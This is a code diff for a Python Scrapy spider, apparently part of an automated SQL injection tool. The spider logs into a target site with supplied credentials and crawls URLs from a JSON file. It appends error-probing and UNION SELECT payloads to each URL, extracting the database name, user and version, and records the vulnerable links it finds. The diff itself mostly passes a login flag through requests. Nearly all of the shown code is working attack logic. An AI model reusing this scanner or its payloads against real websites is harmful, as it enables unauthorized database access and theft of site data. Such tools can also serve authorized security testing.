@@ -23,21 +23,6 @@ actual_payloads = ["%27+and+1=2+union+select+1,2,database%28%29,user%28%29,5,6,v
 "%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29+--+"]
 
 #links = open('links.txt','r')
-
-links = open('linksToAttack.txt','w')
-
-with open('data.json') as data_file:
-    data = json.load(data_file)
-
-length = len(data)
-for i in range(0,length-1):
-    jsonval = json.dumps(data[i])
-    data2 = json.loads(jsonval)
-    links.write(data2['url']+"\n")
-links.close()
-links = open('linksToAttack.txt', 'r')
-urls = links.readlines()
-links.close()
 #print urls
 items = []
 fin = {}
@@ -58,11 +43,25 @@ class step3(Spider):
 	loginid = ""
 	passid = ""
 	login_reqd = "false"
-	
+	links = open('linksToAttack.txt','w')
+
+	with open('data.json') as data_file:
+		data = json.load(data_file)
+
+	length = len(data)
+	for i in range(0,length-1):
+		jsonval = json.dumps(data[i])
+		data2 = json.loads(jsonval)
+		links.write(data2['url']+"\n")
+	links.close()
+	links = open('linksToAttack.txt', 'r')
+	urls = links.readlines()
+
 	def parse(self, response):
-		for temp in urls:
+		for temp in self.urls:
+			login = "false"
 			if self.start_urls[0] in temp:
-				yield Request(url=temp, meta={'temp':temp} , callback=self.save_original_resp)
+				yield Request(url=temp, meta={'temp':temp, 'login':login} , callback=self.save_original_resp)
 				
 		#print response
 		args, url, method = fill_login_form(self.start_urls[0], response.body, self.login_user[0], self.login_pass[0])
@@ -74,27 +73,30 @@ class step3(Spider):
 			if a[1] == self.login_pass[0]:
 				self.passid = a[0]
 		print "IDs: " + self.loginid + ", " + self.passid
-		yield FormRequest(url, method=method, formdata=args, callback=self.after_login)
+		yield FormRequest(url, method=method, meta={'login':self.login_reqd}, formdata=args, callback=self.after_login)
 		return
 
 	def __init__(self):
+		
+		self.links.close()
 		dispatcher.connect(self.spider_closed, signals.spider_closed)
 
 	def after_login(self, response):
+		login = response.request.meta['login']
  		if (((("ERROR: Invalid username") or ("The username/password combination you have entered is invalid"))	in response.body) or (response.url is self.start_urls[0])):
 			#self.log("Login failed", level=log.ERROR)
 			yield
 		# continue scraping with authenticated session...
 		else:
-			#self.log("Login succeed!", level=log.DEBUG)
+			self.log("Login succeed!", level=log.DEBUG)
 			#print response.url
 			'''f = open("app4login.html", "w")
 			f.write(response.body)
 			f.close()'''
 			#print "response end!!\n"
-			for temp in urls:
+			for temp in self.urls:
 					if self.start_urls[0] in temp:
-							yield Request(url=temp, meta={'temp':temp} , callback=self.save_original_resp)
+							yield Request(url=temp, meta={'temp':temp, 'login':login} , callback=self.save_original_resp)
 			#file2 = open("vulnerableinks.txt","w")
 			#for item in items:
 					#file2.write(item+"\n")
@@ -112,6 +114,7 @@ class step3(Spider):
 	'''
 	def save_original_resp(self, response):
 		temp = response.request.meta['temp']
+		login = response.request.meta['login']
 		newfile = open('linksWithFalsePayloads.txt','a')
 		##print "Response: " + response.url
 		file = open("original_response.html", "w")
@@ -121,7 +124,7 @@ class step3(Spider):
 		for error in error_payloads:
 				attack_with_payload = temp+error
 				newfile.write(attack_with_payload+"\n")
-				yield Request(attack_with_payload, meta={'temp':temp,'original':original}, callback=self.save_attack_resp)
+				yield Request(attack_with_payload, meta={'temp':temp,'original':original, 'login':login}, callback=self.save_attack_resp)
 				if "&" in temp:
 						queryVals = temp.split('&')
 						length = len(queryVals)
@@ -135,7 +138,7 @@ class step3(Spider):
 										else:
 												finLink += "&"+dupVals[i]
 								newfile.write(finLink+"\n")
-								yield Request(finLink, meta={'temp':temp,'original':original}, callback=self.save_attack_resp)
+								yield Request(finLink, meta={'temp':temp,'original':original, 'login':login}, callback=self.save_attack_resp)
 		newfile.close()
 		return 
 
@@ -144,6 +147,7 @@ class step3(Spider):
 		file.write(response.body)
 		file.close()
 		temp = response.request.meta['temp']
+		login = response.request.meta['login']
 		original = response.request.meta['original']
 		#if searchterms in response.body:
 		if any(term in response.body.lower() for term in searchterms):
@@ -153,11 +157,11 @@ class step3(Spider):
 					items.append(temp)
 					#UnionAndSelectAttacks
 					attackLink1 = temp+actual_payloads[0]
-					yield Request(attackLink1, meta={'temp':temp, 'original':original}, callback=self.actual_attack_resp)
+					yield Request(attackLink1, meta={'temp':temp, 'original':original, 'login':login}, callback=self.actual_attack_resp)
 					attackLink2 = temp+actual_payloads[1]
-					yield Request(attackLink2, meta={'temp':temp, 'original':original}, callback=self.actual_attack_resp)
+					yield Request(attackLink2, meta={'temp':temp, 'original':original, 'login':login}, callback=self.actual_attack_resp)
 					attackLink3 = temp+actual_payloads[2]
-					yield Request(attackLink3, meta={'temp':temp, 'original':original}, callback=self.actual_attack_resp)
+					yield Request(attackLink3, meta={'temp':temp, 'original':original, 'login':login}, callback=self.actual_attack_resp)
 					file2 = open("vulnerableinks.txt","w")
 					file2.write(temp+"\n")
 					file2.close()
@@ -185,7 +189,7 @@ class step3(Spider):
 				dic1["password"] = self.login_pass[0]
 				dic1["loginid"] = self.loginid
 				dic1["passid"] = self.passid
-				print dic1["LoginRequired"]
+				#print dic1["LoginRequired"]
 				#OtherParameterToWrite #Pending
 				dic[response.url] = [dic1]
 		temp = response.request.meta['temp']
